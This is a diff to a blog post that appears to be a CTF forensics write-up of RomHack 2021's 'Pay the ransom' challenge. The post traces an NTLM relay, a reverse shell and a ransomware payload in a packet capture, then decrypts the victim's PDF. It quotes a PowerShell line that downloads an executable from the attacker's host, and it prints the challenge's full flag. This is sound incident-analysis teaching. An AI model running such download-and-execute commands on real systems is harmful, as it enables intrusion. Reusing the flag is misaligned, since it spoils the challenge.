@@ -2,6 +2,7 @@
 layout: post
 title:  "Writeup: RomHack CTF 2021 - Pay the ransom"
 #date:   2021-09-21 TBA
+permalink: /writeups/romhack-2021-pay-the-ransom
 ---
 
 # Writeup: RomHack CTF 2021 - Pay the ransom
@@ -30,7 +31,7 @@ an NTLM authentication request. I'm not very familiar with the NTLM protocol, bu
 based on the capture it looks like the attacker is reusing the authentication
 process to impersonate as the victim to the SMB service at 192.168.1.11.
 
-![HTTP-NTLM-SMB]({{site.path_img}}/writeups/romhack2021-ransom-http-ntlm-smb.png)
+[![HTTP-NTLM-SMB]({{site.path_img}}/writeups/romhack2021-ransom-http-ntlm-smb.png)]({{site.path_img}}/writeups/romhack2021-ransom-http-ntlm-smb.png)
 
 If we look at the SMB traffic we see that the attacker has now authenticated as
 CORP\fcastle. We also see that it is connecting to the \IPC$ share and using
@@ -39,7 +40,7 @@ command execution over SMB, but my guess is it looks something like what we see
 in this capture file. Following the TCP stream related to the SMB traffic we can
 see that there are PowerShell commands being sent to 192.168.1.11.
 
-![SMB PowerShell]({{site.path_img}}/writeups/romhack2021-ransom-tcp-stream-smb.png)
+[![SMB PowerShell]({{site.path_img}}/writeups/romhack2021-ransom-tcp-stream-smb.png)]({{site.path_img}}/writeups/romhack2021-ransom-tcp-stream-smb.png)
 
 Let's decode that base64-encoded execute.bat:
 
@@ -57,8 +58,8 @@ When looking for _rev.ps1_ and the resulting reverse shell, I noticed that the
 +/- buttons in the follow-dialogue are a handy way of browsing the TCP streams.
 The HTTP request for _rev.ps1_ is in stream 7 and the shell in 8.
 
-![TCP stream
-browsing]({{site.path_img}}/writeups/romhack2021-ransom-browse-stream.png)
+[![TCP stream
+browsing]({{site.path_img}}/writeups/romhack2021-ransom-browse-stream.png)]({{site.path_img}}/writeups/romhack2021-ransom-browse-stream.png)
 
 The reverse shell was doing some basic enumeration of the system and using
 Mimikatz. It also issued the following command:
@@ -68,9 +69,49 @@ iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.16:8080/mus
 ```
 
 The brief also mentioned that the victim was listening to music while this
-happened.
+happened. This was pretty much a hint for what to investigate next. I extracted
+_music.exe_ and opened it in dotPeek on a Windows VM. As a side note, I use
+[Flare VM](https://github.com/mandiant/flare-vm) as my Windows test machine, as
+it installs plenty of handy software.
 
-TODO
+The binary decompiles nicely and reveals a `Reverse_Shell` namespace. Sounds
+relevant. There is also a string called `part2` with the value `_th3_r4ns0m_1s`.
+No doubt the 2nd part of the flag. Most of the code in the reverse shell is
+fairly standard - open a TCP stream to C&C server, encrypt (xor) the data,
+receive commands for either RCE or something specific. The most relevant part of
+the program can be seen in the image below:
+
+[![Reverse shell encryption
+command]({{site.path_img}}/writeups/romhack2021-ransom-revshell.png)]({{site.path_img}}/writeups/romhack2021-ransom-revshell.png)
+
+The function `injran` takes a xor key (`part2` was used as the key) and decrypts
+an Assembly object from the attacker's server. I extracted the the _party.b64_
+file from the capture and this time used
+[CyberChef](https://gchq.github.io/CyberChef/) to decode and decrypt the data,
+which turns out to be `PE32+ executable (console) x86-64 Mono/.Net assembly, for
+MS Windows`. Decompiling it in dotPeek reveals some key information about how
+the encryption was done. The images below are the key takeaways.
+
+[![AES assembly object part
+1]({{site.path_img}}/writeups/romhack2021-ransom-aes1.png)]({{site.path_img}}/writeups/romhack2021-ransom-aes1.png)
+
+[![AES assembly object part
+2]({{site.path_img}}/writeups/romhack2021-ransom-aes2.png)]({{site.path_img}}/writeups/romhack2021-ransom-aes2.png)
+
+The program creates an AES cipher in CFB mode with blocksize of 128, PKCS7
+padding, a PBKDF2 generated key with 50000 iterations with a randomly generated
+password, and a randomly generated salt. The salt is prepended to the resulting
+encrypted file, and the password is xored with a key (the same xor key). The
+encrypted key is then sent to the attacker's server over HTTP to _/post.php_.
+Those are all the required parameters for encryption and decryption. Below is an
+image of the decrypted PDF.
+
+[![Invoice
+PDF]({{site.path_img}}/writeups/romhack2021-ransom-invoice-pdf.png)]({{site.path_img}}/writeups/romhack2021-ransom-invoice-pdf.png)
+
+We've successfully decrypted the PDF and can most likely decrypt any other files
+the malware might have encrypted. The full flag read
+`HTB{n0t_p4y1ng_th3_r4ns0m_1s_4lw4ys_th3_4nsw3r!!!}`.
 
 ## This didn't really happen
 
